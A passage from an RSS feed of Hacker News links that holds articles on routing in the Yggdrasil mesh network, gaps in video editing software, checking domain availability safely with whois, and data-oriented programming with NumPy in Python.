Typically, shortest path routing is implemented either via a proactive protocol, wherein every node in a network maintains a local routing table with information about every other node in the network, or via a reactive protocol using broadcast lookup traffic, wherein routes are found by broadcasting lookups through the entire network.</p>

<p>There are things about this approach which can be problematic.
The main issue, for the purposes of this post, is scalability.
For a large network to scale, it must be subnetted into smaller, more easily manageable networks, which then must in turn be networked together (to form a network of networks from inter-network connections, i.e. the internet).
This requires some level of expertise and planning to do, and tends to favor hierarchies wherein small networks are largely at the mercy of a larger network (e.g. the only connection your LAN has to another network is your connection to an ISP, and ‚Äúpeering‚Äù or directly connecting to your neighbor‚Äôs LAN is virtually unheard of).
If you don‚Äôt subnet efficiently, then large networks can become overloaded by protocol traffic alone.
What‚Äôs worse, the kinds of network topologies that show up in practice (small-world / scale-free networks) are among the topologies for which hierarchical addressing and CIDR are least effective at aggregating routes, which contributes to (and I dare say, <em>causes</em>) very large <a href="https://en.wikipedia.org/wiki/Border_Gateway_Protocol">BGP</a> routing tables in the <a href="https://en.wikipedia.org/wiki/Default-free_zone">DFZ</a>.</p>

<h3 id="compact-routing">Compact Routing</h3>

<p>So, what if we didn‚Äôt do that?</p>

<p><a href="https://arxiv.org/abs/0708.2309">Compact routing</a> is the study of the fundamental trade-off between the stretch of a routing scheme (the length of the paths it finds, relative to the shortest paths in the network) vs the size of the routing table required to find a path.
Essentially, compact routing proposes that, rather than require each node in the network be able to find the <em>best</em> path, we only require that they find a <em>good</em> path.
In doing so, it becomes possible to reduce the size of each node‚Äôs routing table.</p>

<p>To skip over the details, there are basically two aspects to consider that are relevant to this post.
First, compact routing schemes can be name-dependent or name-independent.
Name-dependent routing schemes assign an address (of some kind, not necessarily a familiar IP address) based on a node‚Äôs location in the network.
Name-independent routing schemes place no requirements on a node‚Äôs address, and treat it as some opaque identifier in a flat (i.e. non-subnetted) address space.
Secondly, compact routing schemes can either be a universal scheme, with strong guarantees on all possible network types, or they can be specific to certain network topologies.</p>

<p>On paper, compact routing is essentially a solved problem: universal name-dependent routing schemes are known with worst case scenario performance guarantees that are basically equal to the best case scenario lower bounds proven by the mathematicians who do that sort of thing.
Furthermore, name-independent routing schemes are known with the same performance guarantees, albeit much worse observed performance <em>in practice</em> (still better than the guaranteed worst cases, but not by as much).
However, practical compact routing has yet to be realized.
Although the schemes themselves are known, in the sense that someone with a full view of the network can figure out who needs to know what to route packets effectively, a distributed algorithm suitable for dynamic networks is still a topic of ongoing work, and no publicly available implementation.</p>

<h3 id="greedy-embedded-routing">Greedy Embedded Routing</h3>

<p>So, what if we didn‚Äôt do that?</p>

<p><a href="https://en.wikipedia.org/wiki/Greedy_embedding">Greedy embedded</a> routing algorithms take a slightly different approach.
Instead of a routing table about some remote subset of the network, each node knows information about itself and its directly connected (one-hop) neighbors, which we refer to as ‚Äúpeers‚Äù in Yggdrasil.
In particular, each node knows the location of itself, and its peers, in some metric space.</p>

<p>For example: consider the case of a two-dimensional square grid, with no gaps, holes, or other irregularities that could obstruct the flow of traffic.
Every node‚Äôs ‚Äúaddress‚Äù is simply the X and Y coordinates of the node in the network.
Because there are no gaps in this example, every node can route traffic simply by forwarding it to any neighbor which is closer to the destination‚Äôs X-Y coordinates than itself.
This is called a greedy routing strategy, and coordinate systems where this strategy is guaranteed to work are called greedy embeddings.</p>

<p>While there is no finite dimensional Euclidean space for which a greedy embedding exists on all possible graphs, so the dimension of Euclidean embeddings need to be changed due to network size and topology, which ‚Ä¶</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yggdrasil-network.github.io/2018/07/17/world-tree.html">https://yggdrasil-network.github.io/2018/07/17/world-tree.html</a></em></p>]]>
            </description>
            <link>https://yggdrasil-network.github.io/2018/07/17/world-tree.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512311</guid>
            <pubDate>Fri, 18 Sep 2020 02:24:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[S-Flux V3, Flux pattern implementation with the ease of use of a Redux]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512310">thread link</a>) | @nomoredeps
<br/>
September 17, 2020 | https://nomoredeps.github.io/shadowjs | <a href="https://web.archive.org/web/*/https://nomoredeps.github.io/shadowjs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://nomoredeps.github.io/shadowjs</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512310</guid>
            <pubDate>Fri, 18 Sep 2020 02:24:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is video editing so horrible today?]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512292">thread link</a>) | @pavel_lishin
<br/>
September 17, 2020 | https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/ | <a href="https://web.archive.org/web/*/https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><main id="genesis-content"><article itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text"><p>Reading Time: 5 minutes read</p>




<p>In the last three months, I have done more video post-production than I have done in the past 12 years. Surprisingly, in these years, nothing seems to have changed. Considering how much media is now machine analyzable content, such as audio and visual, I‚Äôm surprised there aren‚Äôt more patterns that make navigating and arranging video content faster. Beyond that, I‚Äôm surprised there isn‚Äôt more process for programmatically composing video in a polished complimentary way to the existing manual methods of arranging.</p>



<p>In 1918, when the video camera was created, if you filmed something and wanted to edit it, you took your footage, cut it and arranged it according to how you wanted it to look. Today, if you want to edit a video, you have to import the source assets into a specialty program (such as Adobe Premiere), and then manually view each item to watch/listen for the portion that you want. Once you have the sections of each imported asset, you have to manually arrange each item on a timeline. Of course a ton has changed, but the general workflow feels the same.</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/editing._D18377.jpg?resize=379%2C395&amp;ssl=1" alt="Should Critics and Festivals Give Editing Awards? Yes, and Here's Why |  IndieWire" width="379" height="395" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/editing._D18377.jpg?resize=379%2C395&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Real life photo of me navigating my Premiere assets folders</figcaption></figure></div>



<p>How did video production and editing not get its digital-first methods of creation? Computing power has skyrocketed. Access to storage is generally infinite. And our computers are networked around the world. How is it that the workflow of import, edit, and export take so long?</p>



<p>The consumerization of video editing has simplified certain elements by abstracting away seemingly important but complicated components, such as the linearity of time. Things like Tiktok seem to be the most dramatic shift in video creation, in that the workflow shifts from immediate review and reshooting of video. Over the years, the iMovies and such have moved timelines, from horizontal representation of elapsed time into general blocks of ‚Äúscenes‚Äù or clips. The simplification through abstraction is important for the general consumer, but reduces the attention to detail. This creates an aesthetic of its own, which seems to be the result of the changing of tools. </p>



<p>Where are all the things I take for granted in developer tools, like autocomplete or class-method search, in the video equivalent? What is autocomplete look like in editing a video clip? Where are the repeatable ‚Äúpatterns‚Äù I can write once, and reuse everywhere? Why does each item on a video canvas seem to live in isolation from one another, with no awareness of other elements or an ability to interact with each other?</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=352%2C175&amp;ssl=1" alt="" width="352" height="175" srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?zoom=2&amp;resize=352%2C175&amp;ssl=1 704w" sizes="(max-width: 352px) 100vw, 352px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=1024%2C513&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=768%2C385&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?zoom=2&amp;resize=352%2C175&amp;ssl=1 704w" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.15.56-PM-1.png?resize=352%2C175&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>My code editor searches my files and tried to ‚Äúimport‚Äù the methods when I start typing.</figcaption></figure></div>



<p>As someone who studied film and animation exclusively for multiple years, I‚Äôm generally surprised that the overall ways of producing content are largely the same as they have been 10 years ago, but also seemingly for the past 100.</p>



<p>I understand that the areas of complexity have become more niche, such as in VFX or multi-media. I have no direct experience with any complicated 3D rendering and I haven‚Äôt tried any visual editing for non-traditional video displays, so its a stretch to say film hasn‚Äôt changed at all. I haven‚Äôt touched the surface in new video innovation, but all considering, I wish some basic things were much easier.</p>



<p>For one, when it comes to visual layout, I would love something like the Figma ‚Äúautolayout‚Äù functionality. If I have multiple items in a canvas, I‚Äôd like them to self-arrange based on some kind of box model. There should be a way to assign the equivalent of styles as ‚Äúclasses‚Äù, such as with CSS, and multiple text elements should be able to inherit/share padding/margin definitions. Things like flexbox and relative/absolute positioning would make visual templates significantly much easier and faster for developing fresh video content.</p>



<div><figure><img src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=368%2C157&amp;ssl=1" alt="" width="368" height="157" srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1024%2C438&amp;ssl=1 1024w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=300%2C128&amp;ssl=1 300w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=768%2C328&amp;ssl=1 768w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1536%2C656&amp;ssl=1 1536w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=2048%2C875&amp;ssl=1 2048w" sizes="(max-width: 368px) 100vw, 368px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1024%2C438&amp;ssl=1 1024w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=300%2C128&amp;ssl=1 300w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=768%2C328&amp;ssl=1 768w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=1536%2C656&amp;ssl=1 1536w, https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=2048%2C875&amp;ssl=1 2048w" data-lazy-src="https://i1.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.10.22-PM-1.png?resize=368%2C157&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Currently I make visual frames in Figma, then export them because its so much easier than fumbling through the 2D translations in Premiere</figcaption></figure></div>



<p>I would love to have a ‚Äúsmarter‚Äù timeline that can surface ‚Äúcues‚Äù that I may want to hook into for visual changes. The cues could make use of machine analyzable features in the audio and video, based on features detected in the available content. This is filled with lots of hairy areas, and definitely sounds nicer than it might be in actuality. At a basic example, the timeline could look at audio or a transcript and know when a certain speaker is talking. There are already services, such as Descript, that make seamless use of speaker detection. That should find some expression in video editing software. Even if the software itself doesn‚Äôt detect this information, the metadata from other software should be made use of.</p>



<figure><img src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1" alt="" srcset="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1 1024w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=300%2C230&amp;ssl=1 300w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=768%2C589&amp;ssl=1 768w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?w=1256&amp;ssl=1 1256w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;ssl=1 1024w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=300%2C230&amp;ssl=1 300w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=768%2C589&amp;ssl=1 768w, https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?w=1256&amp;ssl=1 1256w" data-lazy-src="https://i2.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.18.45-PM.png?resize=1024%2C786&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>The two basic views in Zoom. Grid or speaker.</figcaption></figure>



<p>More advanced would be to know when certain exchanges between multiple people are a self-encompassed ‚Äúpoint‚Äù. Identifying when a ‚Äúexchange‚Äù takes place, or when a ‚Äúquestion‚Äù is ‚Äúanswered‚Äù, would be useful for title slides or lower-thirds with complimentary text.</p>



<div><figure><img src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=350%2C255&amp;ssl=1" alt="" width="350" height="255" srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=1024%2C746&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?w=1450&amp;ssl=1 1450w" sizes="(max-width: 350px) 100vw, 350px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=1024%2C746&amp;ssl=1 1024w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=300%2C218&amp;ssl=1 300w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=768%2C559&amp;ssl=1 768w, https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?w=1450&amp;ssl=1 1450w" data-lazy-src="https://i0.wp.com/blog.rememberlenny.com/wp-content/uploads/2020/09/Screen-Shot-2020-09-15-at-12.16.57-PM.png?resize=350%2C255&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Descript will identify speakers and color code the transcript.</figcaption></figure></div>



<p>If there are multiple shots of the same take, it would be nice to have the clips note where the beginning and end based on lining up the audio. Reviewing content shouldn‚Äôt be done in a linear fashion if there are ways to distinguish content of video/audio clip and compare it to itself or other clips.</p>



<p>In line with ‚Äúcues‚Äù, I would like to ‚Äúsearch‚Äù my video in a much more comprehensive way. My iPhone photos app lets me search by faces or location. How about that in my video editor? All the video clips with a certain face or background?</p>



<p>Also, it would be nice to generate these ‚Äúfeatures‚Äù with some ease. I personally dont know what it would take to train a feature detector by viewing some parts of a clip, labeling it, and then using the labeled example to find the other instances of similar kinds of visual content. I do know its possible, and that would be very useful for speeding up the editing process.</p>



<p>In my use case, I‚Äôm seeing a lot of video recordings of Zoom calls or webinars. This is another example of video content that generally looks the ‚Äúsame‚Äù and could be analyzed for certain content types. I would be able to quickly navigate through clips if I could be able to filter video by when the video is a screen of many faces viewed at once, or when only one speaker is featured at a time. </p>



<p>All of this to say, there is a lot of gaps in the tools available at the moment.</p>

</div></article></main></div></div></div>]]>
            </description>
            <link>https://blog.rememberlenny.com/2020/09/15/why-is-video-editing-so-horrible-today/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512292</guid>
            <pubDate>Fri, 18 Sep 2020 02:20:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to search for domain names securely]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512106">thread link</a>) | @stanislavb
<br/>
September 17, 2020 | https://stanbright.com/domain-name-search/ | <a href="https://web.archive.org/web/*/https://stanbright.com/domain-name-search/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <div>
        

<p>
  <iframe width="560" height="315" src="https://www.youtube.com/embed/sP50FsAFJls" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>

<p>Yup, domain names are very important for every business, project or idea
you want to spread on the Internet. Many people spend a log of energy
on finding the perfect name only to find out that the relevant ‚Äú.com‚Äù domain has been taken.
It is not a surprise South Park has an episode on that.</p>

<p>There are three major ways to perform a <strong>domain name search</strong> and see if
the domain you are looking for is FREE.</p>

<h2 id="first---check-the-domain-availability-directly-on-your-domain-name-registrar">First - check the domain availability directly on your domain name registrar</h2>

<p>This is the go-to method for most people. It is the most direct and works in general.
Why ‚Äúin general‚Äù? Because you should trust your <a href="https://www.saashub.com/best-domain-name-registrar-software" target="_blank">domain name registrar</a>.
It is not easy to prove; however, it is believed that some registrars are involved
in <a href="https://en.wikipedia.org/wiki/Cybersquatting" target="_blank">Cybersquatting</a>. You can read
this relevant thread on Hacker News - <a href="https://news.ycombinator.com/item?id=24506303" target="_blank">Tell HN: Never search for domains on Godaddy.com</a>.
What is happening is that you search for your shiny new domain name, it is FREE,
but you decide to postpone buying it immediately.
However, a few days later, when you have mustered up the enthusiasm to buy the name,
you find out that your name is already taken. Believe me, it‚Äôs a very saddening feeling.</p>

<p>The tricky part is that by using their search, registrars KNOW which
domain names you are interested in as well as the trendy names
that people, on the whole, are looking for. So, they have the data and means to
buy those domains and then try reselling them for more (Cybersquatting).
Of course, if they are caught doing that, it could be detrimental to their business.
That‚Äôs why I still believe that most registrars are not doing it.
Yet you never know.</p>

<h2 id="second---check-availability-through-a-third-party-service">Second - check availability through a third-party service</h2>

<p>This is one of the options I‚Äôve been using from time to time. These are utility services
that make money when they refer you to the domain name registrars. For example,
<a href="https://www.namebounce.com/" target="_blank">NameBounce</a> and its <a href="https://www.saashub.com/namebounce-alternatives" target="_blank">alternatives</a>
can generate a few dozens of free domain names based on a keyword.
In my opinion, this is a bit safer as long as you use a generic keyword.
In most cases the base ‚Äúkeyword.com‚Äù will be taken but you will be given a list of
dozens of other free options (e.g. Keyword<b>Life</b>.com <b>Max</b>Keyword.com, etc)
So, whoever knows that you have interest in <em>keyword.com</em>, they can‚Äôt know which of
the other hundred options you‚Äôve decided to use. Moreover, it will be very expensive
to grab all of them.</p>



<p>This is not the most straightforward option, but it is <strong>the most secure way to perform
a <em>domain name search</em></strong> and check if a name is available. What you have to do is
opening a terminal typing <code>whois my-domain-name.com</code> (<code>whois -v my-domain-name.com</code> if using Windows)
and reading/interpreting the results.</p>

<p>In the response from the server, you can find out who and when registered the name
and if it is free. There are two inconveniences following this approach. You
have to read all the data (a few screens) that was returned and learn to read it.
That may take some time if you don‚Äôt have experience. If the name is free,
somewhere at the end of the whois-response,
there will be a line like <code>No match for domain "SAASHUB123.COM".</code>.
Then, when you decide, just go and register the domain.</p>

<p>As this third option is my preferred approach for checking names, I‚Äôve been using
a simple bash script that automates the boring parts. You can copy-paste it
from this Github gist - <a href="https://gist.github.com/StanBright/b236675e272ace1b385a9a0f2d543a1f" target="_blank">domain_check.sh</a>.
To set it up, copy that script to your <code>~/bin</code> directory, <code>chmod 755 ~/domain-check.sh</code> and list
all extensions (separated by a space) in the <code>DOMAINS=( '.com' '.io' )</code> section.</p>

<p>Then checking for an available name is as simple as opening your terminal, and
you don‚Äôt have to worry that someone will register the same name tomorrow.</p>

<div><div><pre><code>stan@StansMacBook15:~$ domain_check.sh saashub123
saashub123.com - available
saashub123.io - available
</code></pre></div></div>
<p><br>
And remember to follow ‚Äú<a href="https://stanbright.com/3-day-rule">The 3 day domain name rule</a>‚Äù
before buying any new names.</p>


<div>
  <p>
    Stan
  </p>
  <p>
    Sep 18, 2020<br>
    // Tech
  </p>
</div>




<hr>


      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://stanbright.com/domain-name-search/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512106</guid>
            <pubDate>Fri, 18 Sep 2020 01:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Oriented Programming in Python]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24511966">thread link</a>) | @brilee
<br/>
September 17, 2020 | https://www.moderndescartes.com/essays/data_oriented_python/ | <a href="https://web.archive.org/web/*/https://www.moderndescartes.com/essays/data_oriented_python/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
	

<p> Originally posted 2020-09-13</p>
<p> Tagged: <a href="https://www.moderndescartes.com/essays/tags/optimization">optimization</a>, <a href="https://www.moderndescartes.com/essays/tags/computer_science">computer_science</a>, <a href="https://www.moderndescartes.com/essays/tags/python">python</a></p>
<p> <em>Obligatory disclaimer: all opinions are mine and not of my employer </em></p>
<hr>

<p>Many users of Python deprioritize performance in favor of soft benefits like ergonomics, business value, and simplicity. Users who prioritize performance typically end up on faster compiled languages like C++ or Java.</p>
<p>One group of users is left behind, though. The scientific computing community has lots of raw data they need to process, and would very much like performance. Yet, they struggle to move away from Python, because of network effects, and because Python‚Äôs beginner-friendliness is appealing to scientists for whom programming is not a first language. So, how can Python users achieve some fraction of the performance that their C++ and Java friends enjoy?</p>
<p>In practice, scientific computing users rely on the NumPy family of libraries e.g.&nbsp;NumPy, SciPy, TensorFlow, PyTorch, CuPy, JAX, etc.. The sheer proliferation of these libraries suggests that the NumPy model is getting something right. In this essay, I‚Äôll talk about what makes NumPy so effective, and where the next generation of Python numerical computing libraries (e.g.&nbsp;TensorFlow, PyTorch, JAX) seems to be headed.</p>
<h2 id="data-good-pointers-bad">Data good, pointers bad</h2>
<p>A pesky fact of computing is that computers can compute far faster than we can deliver data to compute on. In particular, data transfer <em>latency</em> is the Achille‚Äôs heel of data devices (both RAM and storage). Manufacturers disguise this weakness by emphasizing improvements in data transfer <em>throughput</em>, but latency continues to stagnate. Ultimately, this means that any chained data access patterns, where one data retrieval must be completed before the next may proceed, are the worst case for computers.</p>
<p>These worst-case chained data access patterns are unfortunately quite common ‚Äì so common that they have a name you may be familiar with: a pointer.</p>
<p>Pointers have always been slow. In the ‚Äô80s and ‚Äô90s, our hard drives were essentially optimized record players, with a read head riding on top of a spinning platter. These hard drives had physical limitations: The disk could only spin so fast without shattering, and the read head was also mechanical, limiting its movement speed. Disk seeks were slow, and the programs that were most severely affected were databases. Some ways that databases dealt with these physical limitations are:</p>
<ul>
<li>Instead of using binary trees (requiring <span>\(\log_2 N\)</span> disk seeks), B-trees with a much higher branching factor <span>\(k\)</span> were used, only requiring <span>\(\log_k N\)</span> disk seeks.</li>
<li>Indices were used to query data without having to read the full contents of each row.</li>
<li>Vertically-oriented databases optimized for read-heavy workloads (e.g.&nbsp;summary statistics over one field, across entire datasets), by reorganizing from <a href="https://en.wikipedia.org/wiki/AoS_and_SoA">arrays of structs to structs of arrays</a>. This maximized effective disk throughput, since no extraneous data was loaded.</li>
</ul>
<p>Today, compute speed is roughly <span>\(10^5 - 10^6\)</span> times faster than in 1990. Today, RAM is roughly <span>\(10^5\)</span> times faster than HDDs from 1990. I was amused and unsurprised to find that Raymond Hettinger‚Äôs <a href="https://www.youtube.com/watch?v=npw4s1QTmPg">excellent talk on the evolution of Python‚Äôs in-memory <code>dict</code> implementation</a> plays out like a brief history of early database design. Time, rather than healing things, has only worsened the compute-memory imbalance.</p>
<h2 id="numpys-optimizations">NumPy‚Äôs optimizations</h2>
<h3 id="boxing-costs">Boxing costs</h3>
<p>In many higher-level languages, raw data comes in boxes containing metadata and a pointer to the actual data. In Python, the PyObject box holds reference counts, so that the garbage collector can operate generically on all Python entities.</p>
<p>Boxing creates two sources of inefficiency:</p>
<ul>
<li>The metadata bloats the data, reducing the data density of our expensive memory.</li>
<li>The pointer indirection creates another round trip of memory retrieval latency.</li>
</ul>
<p>A NumPy array can hold many raw data within a single PyObject box, <em>provided that all of those data are of the same type</em> (int32, float32, etc.). By doing this, NumPy amortizes the cost of boxing over multiple data.</p>
<p>In <a href="https://www.moderndescartes.com/essays/deep_dive_mcts">my previous investigations into Monte Carlo tree search</a>, a naive UCT implementation performed poorly because it instantiated millions of UCTNode objects whose sole purpose was to hold a handful of float32 values. In the optimized UCT implementation, these nodes were replaced with NumPy arrays, reducing memory usage by a factor of 30.</p>
<h3 id="attribute-lookup-function-dispatch-costs">Attribute lookup / function dispatch costs</h3>
<p>Python‚Äôs language design forces an unusually large amount of pointer chasing. I mentioned boxing as one layer of pointer indirection, but really it‚Äôs just the tip of the iceberg.</p>
<p>Python has no problem handling the following code, even though each of these multiplications invokes a completely different implementation.</p>
<pre><code>&gt;&gt;&gt; mixed_list = [1, 1.0, 'foo', ('bar',)]
&gt;&gt;&gt; for obj in mixed_list:
...     print(obj * 2)

2
2.0
'foofoo'
('bar', 'bar')</code></pre>
<p>Python accomplishes this with a minimum of two layers of pointer indirection:</p>
<ol type="1">
<li>Look up the type of the object.</li>
<li>Look up and execute the <code>__mul__</code> function from that type‚Äôs operation registry.</li>
</ol>
<p>Additional layers of pointer indirection may be required if the <code>__mul__</code> method is defined on a superclass: the chain of superclasses must be traversed, one pointer at a time, until an implementation is found.</p>
<p>Attribute lookup is similarly fraught; <code>@property</code>, <code>__getattr__</code>, and <code>__getattribute__</code> provide users with flexibility that incurs pointer chasing overhead with something as simple as executing <code>a.b</code>. Access patterns like <code>a.b.c.d</code> create exactly the chained data access patterns that are a worst-case for data retrieval latency.</p>
<p>To top it all off, merely <em>resolving</em> the object is expensive: there‚Äôs a stack of lexical scopes (local, nonlocal, then global) that are checked in order to find the variable name. Each check requires a dictionary lookup, another source of pointer indirection.</p>
<p>As the saying goes: ‚ÄúWe can solve any problem by introducing an extra level of indirection‚Ä¶ except for the problem of too many levels of indirection‚Äù. The NumPy family of libraries deals with this indirection, not by removing it, but again by sharing its cost over multiple data.</p>
<pre><code>&gt;&gt;&gt; homogenous_array = np.arange(5, dtype=np.float32)
&gt;&gt;&gt; multiply_by_two = homogenous_array * 2
&gt;&gt;&gt; print(multiply_by_two)
array([ 0.,  2.,  4.,  6.,  8.], dtype=float32)</code></pre>
<p>Sharing a single box for multiple data allows NumPy to retain the expressiveness of Python while minimizing the cost of the dynamism. As before, this works because of the additional constraint that all data in a NumPy array must have identical type.</p>
<h2 id="the-frontier-jit">The Frontier: JIT</h2>
